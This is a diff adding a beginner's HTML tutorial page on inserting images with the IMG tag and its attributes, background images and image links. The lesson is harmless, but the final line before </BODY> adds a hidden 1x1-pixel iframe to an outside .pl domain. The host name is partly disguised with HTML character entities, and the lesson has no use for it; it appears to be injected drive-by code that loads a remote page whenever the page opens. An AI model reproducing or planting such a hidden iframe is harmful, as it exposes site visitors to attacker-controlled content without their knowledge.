@@ -1,0 +1,65 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 8: Adding Images to our Pages</TITLE> 
+</HEAD>
+
+<BODY>
+<H2>Lesson 8: Adding Images to our Pages</H2>
+
+Well, text is very important, but it can only take you so far. I'm sure that up until now, if anyone has seen your pages they're asking "Where are the pictures?". Yeah, I know Uncle Bob is dying to see the latest picture of you and the family on your website, so this lesson is about adding images to your pages.<p>
+
+Putting images on a web page is simple. It's probably even simpler than it was for you to get the certain image onto your computer! The &#60;IMG&#62;, or <i>Image</i> tag is used when we want an image on our web page. When we use &#60;IMG&#62;, we do'nt need to close it with a &#60;/IMG&#62;. To tell the browser where to load this image from, we use the SRC, or source, attribute. It looks alot like this:<p>
+
+&#60;IMG SRC="jussmall.gif"&#62;<p>
+
+And it loads on to the page, just like this:<p>
+
+<IMG SRC="jussmall.gif"><p>
+
+Note that we can use relative linking just like with in the &#60;A&#62; tag, like SRC="../jussmall.gif" if the image was in the directory above the current one, or SRC="pictures/jussmall.gif" if the image was in the pictures directory.<p>
+
+Because some browsers do'nt load images, and some people turn them off, we need a way to show them what this image is. The solution? The ALT attribute! ALT is an optional (but highly recommended) attribute. When a browser does'nt load an image, or when they are turned off, the text in ALT will be shown instead. In our &#60;IMG&#62; tag it's used a little like this:<p>
+
+&#60;IMG SRC="mypic.gif" ALT="Check this out - It's a picture of me!"&#62;<p>
+
+Need more control over your image's positioning? Try using the ALIGN attribute in it! The ALIGN attribute can be used to put an image in the left, right, middle, top, or bottom of a page. Is this more choices than you're used to? Let me explain. If we add ALIGN="top" to our &#60;IMG&#62; tag, the browser will align the top of our image to the top of the current line. ALIGN="bottom" aligns the image to the bottom of the current line, and ALIGN="middle" aligns our image to the middle of the current line. Aligning our image to the left or right aligns it to the left margin, or right margin of the page. Got it? Ok, here's a little pop quiz. What will the following code do?<p>
+
+&#60;IMG SRC="myimg.jpg" ALT="My image!" ALIGN="left"&#62;<p>
+
+If you said it adds the image myimg.jpg to the current page with alternate text "My image" and left aligns it, you're wrong! Heh heh, just a joke, you're correct ;).<p>
+
+All right! The image looks great but...Hey! What's this border doing around my picture? Oh yeah! We forgot about the BORDER attribute!<p>
+
+The BORDER attribute takes a number as an argument. This number will be the width of the border around your image. Quick, how do we get rid of the border with the BORDER attribute? Easy, we just set &#60;IMG SRC="myimg.gif" BORDER="0"&#62;!<p>
+
+Yuuup, we've got an image on the page. But wait: why does the browser wait to load the image before displaying the rest of the page? Well, the browser does'nt automatically know how big your image is. You can give it this information (and make your pages load faster!) with the WIDTH and HEIGHT attributes. We give to the WIDTH and HEIGHT attributes the width and height of our image in pixels. So it looks like this:<p>
+
+&#60;IMG SRC="newimg.gif" ALT="A new image" HEIGHT=120 WIDTH=200&#62;<p>
+
+Another benefit of specifying the WIDTH and HEIGHT in the &#60;IMG&#62; tag is that you can make sure that the proper space is left for your image, even if the viewer has images turned off.<p>
+
+Is the space around your image a little cramped? Try adding the HSPACE and VSPACE attributes to your &#60;IMG&#62; tag. These attributes add horizontal and vertical spacing around your image.<p>
+
+Want an image for the background of your page? Try adding the BACKGROUND attribute to the &#60;BODY&#62; tag. It's used a little like the SRC attribute to the &#60;IMG&#62; tag. Here's and example:<p>
+
+&#60;BODY BACKGROUND="mybackground.gif"&#62;<p>
+
+This would take mybackground.gif, and tile it in the background of our page. Be warned though, use the wrong background image and your viewers may be straining to see your text!<p>
+
+Think you're an HTML wizard? Ok hotshot, how do we make images into clickable links? Easy...surround them with an anchor tag! For example:<p>
+
+&#60;A HREF="lesson9.html"&#62;<BR>
+&#60;IMG SRC="nextlesson.gif"&#62;<BR>
+&#60;/A&#62;<p>
+
+Results in this (click on it!):<p>
+
+<A HREF="lesson9.html">
+<IMG SRC="nextlesson.gif">
+</A><p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
